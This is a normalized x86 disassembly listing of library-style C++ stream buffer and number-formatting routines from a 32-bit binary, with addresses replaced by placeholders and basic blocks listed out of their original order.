mov eax [ eax + 0x4 ]
lea esi [ edi + 0xc ]
push esi
mov [ edi + eax ] r--data
mov [ ebp - 0x14 ] esi
call sub_100049ac
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
cmp [ ebx + 0x18 ] 0x8
mov eax [ ebx + 0x14 ]
jb r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
mov eax edi
call sub_1002b37e
retn 0x4
push ebx
call sub_10004a7d
and [ esi + 0x3c ] 0x0
and [ esi + 0x40 ] 0x0
test eax eax
je r-xdata
sub_10003231
push 0x4
mov eax sub_1004fb5a
call sub_1002b2a6
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_100032aa
mov ecx esi
call sub_1000327f
call sub_1002b37e
retn
sub_100032aa
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_100074cf
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_100272e8
pop ecx
sub_100032f3
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov bx [ ebp + 0x8 ]
mov eax 0xffff
cmp ax bx
jne r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp eax edx
jae r-xdata
test [ esi + 0x40 ] 0x2
je r-xdata
mov ecx [ esi + 0x34 ]
mov eax [ ecx ]
mov edx edi
lea eax [ edx + eax * 2 ]
cmp edx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ esi + 0x34 ]
mov edi [ edi ]
lea eax [ eax + edi * 2 ]
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
test edi edi
jne r-xdata
mov eax 0xffff
jmp r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov [ ecx ] bx
mov ax bx
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ebx [ eax ]
mov eax [ esi + 0x10 ]
add ebx ebx
sub ebx [ eax ]
add ebx edi
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test ecx ecx
jbe r-xdata
push 0x20
pop ecx
jmp r-xdata
mov ecx ebx
shr ecx 0x1
cmp ecx 0x20
jae r-xdata
je r-xdata
mov eax 0x7fffffff
sub eax ecx
cmp eax ebx
jae r-xdata
lea eax [ ecx + ebx ]
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_10002399
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] edx
test ebx ebx
jbe r-xdata
test ecx ecx
shr ecx 0x1
jne r-xdata
jne r-xdata
push ebx
push edx
push [ ebp - 0x4 ]
push edi
call sub_10002614
mov edx [ ebp - 0x8 ]
add esp 0x10
test ebx ebx
mov eax [ esi + 0x3c ]
sub eax edx
sar eax 0x1
lea eax [ edi + eax * 2 ]
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
sub eax edx
sar eax 0x1
lea ecx [ edi + eax * 2 ]
mov eax [ esi + 0x14 ]
mov ebx [ eax ]
sub ebx edx
sar ebx 0x1
lea ebx [ edi + ebx * 2 ]
mov [ eax ] ebx
mov eax [ esi + 0x24 ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
add eax eax
sub eax ecx
mov ecx [ esi + 0x34 ]
add eax edi
sar eax 0x1
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x34 ]
add eax eax
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
mov ecx [ esi + 0x20 ]
mov ecx [ ecx ]
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub ecx edx
sar ecx 0x1
lea ecx [ edi + ecx * 2 ]
sub eax ecx
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
inc eax
mov [ edi ] ecx
mov ecx [ esi + 0x30 ]
inc eax
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
sar edi 0x1
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
push edx
call sub_100272e8
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_100034c7
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
push esi
mov eax 0xffff
test edx edx
je r-xdata
pop esi
retn 0x4
mov esi [ ecx + 0x10 ]
cmp edx [ esi ]
jbe r-xdata
mov si [ esp + 0x8 ]
push edi
mov edi eax
cmp di si
pop edi
je r-xdata
mov edx [ ecx + 0x30 ]
inc [ edx ]
mov edx [ ecx + 0x20 ]
add [ edx ] 0xfffffffe
cmp ax si
je r-xdata
cmp si [ edx - 0x2 ]
je r-xdata
xor eax eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] si
movzx eax si
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_1000351a
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
lea ebx [ esi + ebx * 2 ]
cmp esi ebx
jae r-xdata
mov eax 0xffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
mov ax [ edi ]
jmp r-xdata
mov eax 0xffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov ax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_1000357e
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
sar ebx 0x1
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
sar ebx 0x1
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
sar eax 0x1
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add eax eax
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add eax eax
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x34 ]
mov edi [ ecx + 0x20 ]
mov ebx [ ebx ]
mov edi [ edi ]
lea eax [ eax + ebx * 2 ]
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_100036c8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add eax eax
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add eax eax
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x34 ]
mov edi [ ecx + 0x20 ]
mov ebx [ ebx ]
mov edi [ edi ]
lea eax [ eax + ebx * 2 ]
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_100037a1
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_10027827
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
add [ esi + 0x4 ] 0x1c
mov eax esi
retn
call sub_10027827
sub_10003808
push esi
push edi
lea edi [ ecx - 0xc ]
lea esi [ edi + 0xc ]
mov ecx esi
call sub_1000327f
push esi
mov [ esi ] r--data
call sub_10021dee
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_100272e8
pop ecx
sub_10003865
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
call sub_1000986e
mov ebx [ ebp + 0x1c ]
lea esi [ ebp - 0x8 ]
call sub_1000986e
mov edi esi
mov esi [ ebp + 0xc ]
call sub_100037cc
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x18
mov edi [ ebp + 0x8 ]
push [ edi + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x4 ]
call sub_100064eb
pop ecx
push [ edi + 0x10 ]
mov ebx eax
call sub_100139b7
mov [ edi + 0x10 ] ebx
sub_100038bd
push 0x4
mov eax sub_10051597
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push esi
call sub_1000491e
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x8 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax esi
call sub_1002b37e
retn 0x8
sub_100038fd
push 0x40
mov eax sub_10050a5d
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] edi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0x7
call sub_10002630
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_100025cf
lea ecx [ ebp - 0x48 ]
mov ecx [ eax + 0x20 ]
cmp [ ecx ] edi
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov edx [ eax + 0x30 ]
mov ecx [ ecx ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
mov eax [ eax ]
lea ecx [ ecx + edx * 2 ]
sub ecx eax
sar ecx 0x1
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_10004a31
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
sar ecx 0x1
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_10004a31
mov [ ebp - 0x4 ] edi
mov ecx edx
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_100025cf
lea ecx [ ebp - 0x2c ]
jmp r-xdata
push edi
push 0x1
call sub_1000264e
mov eax ebx
call sub_1002b392
retn 0x4
sub_100039ba
push 0x50
mov eax sub_1005057b
call sub_1002b30f
mov esi [ ebp + 0x14 ]
test [ esi + 0x10 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] edi
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx esi
call sub_10007dd5
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000654d
pop ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x38 ] eax
call sub_10007dbd
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0x7
call sub_10002630
mov ecx [ ebp - 0x38 ]
xor edi edi
inc edi
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_10005c3c
mov [ ebp - 0x4 ] 0x3
call sub_10005c53
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_1002b392
retn 0x18
xor edi edi
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000253c
push ebx
push edi
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_1000264e
mov eax [ esi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x8
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_10005373
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
sub eax [ ebp - 0x18 ]
mov edi eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x30 ]
call sub_1000533e
mov ecx [ eax ]
push edi
push [ ebp + 0x18 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x34 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x30 ]
mov [ esi + 0x18 ] ebx
call sub_10005373
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov eax [ ebp - 0x34 ]
lea eax [ ebp - 0x28 ]
mov eax [ esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10003b0b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ esp + 0x1c ]
mov ebx ecx
push eax
push ebx
call sub_10005071
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ esp + 0x2c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100050e5
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x18
sub_10003b84
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ esp + 0x1c ]
mov ebx ecx
push eax
push ebx
call sub_10005071
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ esp + 0x2c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100050e5
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x18
sub_10003bfd
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push ebx
call sub_10005071
add esp 0x10
push eax
lea eax [ esp + 0x24 ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100050e5
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x1c
sub_10003c79
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push ebx
call sub_10005071
add esp 0x10
push eax
lea eax [ esp + 0x24 ]
push 0x40
push eax
call sub_10027b13
push eax
lea eax [ esp + 0x30 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100050e5
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x1c
sub_10003cf5
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
mov [ esp + 0x14 ] eax
push edi
mov eax 0x2000
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
fld [ ebp + 0x1c ]
sub edi [ esp + 0x20 ]
mov edx ecx
and edx 0x3000
mov [ esp + 0x14 ] ebx
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] edi
push 0x6
pop ecx
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push ecx
push 0x0
push eax
push [ esp + 0x34 ]
call sub_10004b0d
add esp 0x10
push eax
lea eax [ esp + 0x38 ]
push 0x6c
push eax
call sub_10027b13
push eax
push edi
push ebx
push [ esp + 0x38 ]
lea eax [ esp + 0x50 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x54 ]
push [ esp + 0x5c ]
call sub_10004b71
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x5c ]
add esp 0x44
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ esp + 0x13 ] bl
fxch st1
fxch st1
mov [ esp + 0x13 ] 0x1
fchs
jmp r-xdata
cmp [ esp + 0x14 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ esp + 0x14 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x13 ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx 0x1388
jae r-xdata
sub edi edx
fmul st1
add ebx edx
jmp r-xdata
sub_10003e75
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x14 ]
mov [ esp + 0x14 ] eax
push edi
mov eax 0x2000
test ecx ecx
jg r-xdata
mov edi ecx
push 0x24
pop ecx
cmp edi ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
sub edi [ esp + 0x20 ]
and [ esp + 0x10 ] 0x0
and [ esp + 0x14 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] edi
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0xf ] 0x0
jmp r-xdata
mov [ esp + 0xf ] 0x1
fchs
fld [ r--data ]
push 0xa
fcom st1
mov ebx 0x1388
pop edx
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x10 ] ebx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ esp + 0x10 ] edx
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0xf ] 0x0
fstp st1
je r-xdata
cmp edi edx
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x28 ]
lea eax [ esp + 0x2c ]
push ecx
push 0x4c
push eax
push [ esp + 0x34 ]
call sub_10004b0d
add esp 0x10
push eax
lea eax [ esp + 0x38 ]
push 0x6c
push eax
call sub_10027b13
push eax
push edi
push [ esp + 0x34 ]
lea eax [ esp + 0x4c ]
push [ esp + 0x34 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ esp + 0x54 ]
push [ esp + 0x5c ]
call sub_10004b71
mov ecx [ esp + 0xe0 ]
mov eax [ esp + 0x5c ]
add esp 0x44
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x1c
fchs
jmp r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ esp + 0x14 ] ebx
jae r-xdata
sub edi edx
fmul st1
add [ esp + 0x14 ] edx
jmp r-xdata
sub_10003fea
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ esp + 0x18 ]
push 0x40
push eax
mov ebx ecx
call sub_10027b13
push eax
lea eax [ esp + 0x24 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_100050e5
mov ecx [ esp + 0x84 ]
add esp 0x30
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x18
sub_10004051
push 0x60
mov eax sub_10050075
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10007dd5
lea ecx [ ebp - 0x5c ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x4
mov esi [ esi + 0x10 ]
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
call sub_1000539c
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007dd5
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_1000654d
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
